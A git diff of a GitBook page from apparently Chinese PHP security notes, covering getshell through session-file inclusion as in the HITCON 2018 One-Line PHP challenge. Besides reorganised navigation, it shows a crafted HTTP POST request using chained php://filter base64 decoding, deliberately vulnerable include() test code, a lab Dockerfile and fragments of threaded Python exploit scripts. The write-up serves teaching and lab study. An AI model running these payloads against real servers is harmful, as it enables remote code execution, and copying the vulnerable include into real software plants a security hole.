@@ -316,25 +316,12 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.4.8" data-path="数组的数组和二维数组.html">
+        <li class="chapter " data-level="2.1.4.8" data-path="REQUEST数组.html">
             
-                <a href="数组的数组和二维数组.html">
-            
-                    
-                    数组的数组和二维数组
-            
-                </a>
-            
-
-            
-        </li>
-    
-        <li class="chapter " data-level="2.1.4.9" data-path="_REQUEST数组.html">
-            
-                <a href="_REQUEST数组.html">
+                <a href="REQUEST数组.html">
             
                     
-                    深入理解_REQUEST数组
+                    REQUEST数组
             
                 </a>
             
@@ -838,7 +825,34 @@
             <ul class="articles">
                 
     
-        <li class="chapter " data-level="2.1.9.1" data-path="包含environ.html">
+        <li class="chapter " data-level="2.1.9.1" data-path="伪协议文件包含.html">
+            
+                <a href="伪协议文件包含.html">
+            
+                    
+                    PHP伪协议
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.9.1.1" data-path="包含日志.html">
+            
+                <a href="包含日志.html">
+            
+                    
+                    包含日志
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.9.1.2" data-path="包含environ.html">
             
                 <a href="包含environ.html">
             
@@ -851,7 +865,7 @@
             
         </li>
     
-        <li class="chapter " data-level="2.1.9.2" data-path="包含临时文件.html">
+        <li class="chapter " data-level="2.1.9.1.3" data-path="包含临时文件.html">
             
                 <a href="包含临时文件.html">
             
@@ -864,7 +878,7 @@
             
         </li>
     
-        <li class="chapter active" data-level="2.1.9.3" data-path="包含session文件.html">
+        <li class="chapter active" data-level="2.1.9.1.4" data-path="包含session文件.html">
             
                 <a href="包含session文件.html">
             
@@ -874,6 +888,11 @@
                 </a>
             
 
+            
+        </li>
+    
+
+            </ul>
             
         </li>
     
@@ -4007,17 +4026,19 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <p>&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF1A;</p>
+                                <h1 id="&#x5305;&#x542B;session&#x6587;&#x4EF6;">&#x5305;&#x542B;Session&#x6587;&#x4EF6;</h1>
+<h4 id="&#x53C2;&#x8003;&#x6587;&#x7AE0;">&#x53C2;&#x8003;&#x6587;&#x7AE0;</h4>
 <ul>
 <li><a href="https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/#%E5%89%8D%E8%A8%80" target="_blank">https://www.kingkk.com/2018/10/hitcon2018-One-Line-PHP-Challenge/#%E5%89%8D%E8%A8%80</a></li>
 <li><a href="https://php.net/manual/zh/session.upload-progress.php" target="_blank">https://php.net/manual/zh/session.upload-progress.php</a></li>
 </ul>
-<p>getshell&#x5229;&#x7528;&#x6761;&#x4EF6;&#xFF1A;  </p>
+<h4 id="getshell&#x5229;&#x7528;&#x6761;&#x4EF6;">getshell&#x5229;&#x7528;&#x6761;&#x4EF6;</h4>
 <ul>
 <li>&#x6587;&#x4EF6;&#x53EF;&#x4E0A;&#x4F20;</li>
 <li>&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x63A7;</li>
 <li>&#x6587;&#x4EF6;&#x53EF;&#x5305;&#x542B;</li>
 </ul>
+<h4 id="payload">payload</h4>
 <p>&#x590D;&#x73B0;&#x7684;repeater&#x5305;(&#x6700;&#x597D;&#x628A;&#x62A5;&#x6587;&#x589E;&#x957F;&#x4E00;&#x70B9;&#xFF0C;&#x611F;&#x89C9;burpsuite&#x7206;&#x7834;&#x6CA1;&#x6709;python&#x811A;&#x672C;&#x7206;&#x7834;&#x6765;&#x7684;&#x5FEB;)&#xFF1A;  </p>
 <pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/?orange=php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/var/lib/php/sessions/sess_j7ur8</span> HTTP/1.1
 <span class="hljs-attribute">Host</span>: 192.168.1.112
@@ -4072,7 +4093,8 @@ Content-<span class="hljs-string">Type:</span> application/octet-stream
 
 ----------------------------<span class="hljs-number">-191691572411478</span>--
 </span></code></pre>
-<h3 id="demo1">demo1</h3>
+<h2 id="&#x6848;&#x4F8B;&#x4E00;">&#x6848;&#x4F8B;&#x4E00;</h2>
+<h4 id="&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#x548C;&#x4EE3;&#x7801;">&#x6D4B;&#x8BD5;&#x73AF;&#x5883;&#x548C;&#x4EE3;&#x7801;</h4>
 <p>Dockerfile&#xFF1A;</p>
 <pre><code class="lang-bash">FROM ubuntu:18.04
 
@@ -4097,6 +4119,7 @@ CMD service apache2 start &amp; tail -F /var/<span class="hljs-built_in">log</sp
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
 ($_=@$_GET[<span class="hljs-string">&apos;orange&apos;</span>]) &amp;&amp; @substr(file($_)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) === <span class="hljs-string">&apos;@&lt;?php&apos;</span> ? <span class="hljs-keyword">include</span>($_) : highlight_file(<span class="hljs-keyword">__FILE__</span>);
 </code></pre>
+<h4 id="payload">payload</h4>
 <p>exp&#x811A;&#x672C;&#x4E3A;&#xFF1A;</p>
 <pre><code class="lang-python"><span class="hljs-keyword">import</span> sys
 <span class="hljs-keyword">import</span> string
@@ -4154,13 +4177,14 @@ pool = ThreadPool(<span class="hljs-number">32</span>)
 result = pool.map_async( runner, range(<span class="hljs-number">32</span>) ).get(<span class="hljs-number">0xffff</span>)
 </code></pre>
 <p><img src="../images/19-6-13_PHP_&#x5305;&#x542B;session&#x6587;&#x4EF6;_demo1.png" alt=""></p>
-<h3 id="demo2">demo2</h3>
-<p>&#x628A;&#x52A0;&#x5BC6;&#x7684;&#x4EE3;&#x7801;&#x6362;&#x6210;</p>
+<h2 id="&#x6848;&#x4F8B;&#x4E8C;">&#x6848;&#x4F8B;&#x4E8C;</h2>
+<h4 id="&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;">&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;</h4>
 <pre><code class="lang-php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">include</span>($_GET[<span class="hljs-string">&apos;file&apos;</span>])
 </code></pre>
+<h4 id="payload">payload</h4>
 <p>&#x5219;exp&#x811A;&#x672C;&#x4E3A;:</p>
-<pre><code class="lang-py"><span class="hljs-keyword">import</span> requests
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> time
 <span class="hljs-keyword">import</span> threading
 
@@ -4234,7 +4258,7 @@ fileName = <span class="hljs-string">&quot;/var/lib/php/sessions/sess_&quot;</sp
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"包含session文件","level":"2.1.8.1","depth":3,"next":{"title":"Session不同解析方式","level":"2.1.8.2","depth":3,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]},"previous":{"title":"Session安全问题","level":"2.1.8","depth":2,"ref":"","articles":[{"title":"包含session文件","level":"2.1.8.1","depth":3,"path":"PHP/包含session文件.md","ref":"./PHP/包含session文件.md","articles":[]},{"title":"Session不同解析方式","level":"2.1.8.2","depth":3,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/包含session文件.md","mtime":"2019-07-10T05:04:37.896Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-07-22T09:32:21.294Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"包含session文件","level":"2.1.8.1","depth":3,"next":{"title":"Session不同解析方式","level":"2.1.8.2","depth":3,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]},"previous":{"title":"Session安全问题","level":"2.1.8","depth":2,"ref":"","articles":[{"title":"包含session文件","level":"2.1.8.1","depth":3,"path":"PHP/包含session文件.md","ref":"./PHP/包含session文件.md","articles":[]},{"title":"Session不同解析方式","level":"2.1.8.2","depth":3,"path":"PHP/Session不同解析方式.md","ref":"./PHP/Session不同解析方式.md","articles":[]}]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"PHP/包含session文件.md","mtime":"2019-07-23T08:04:48.115Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-07-23T08:55:46.947Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
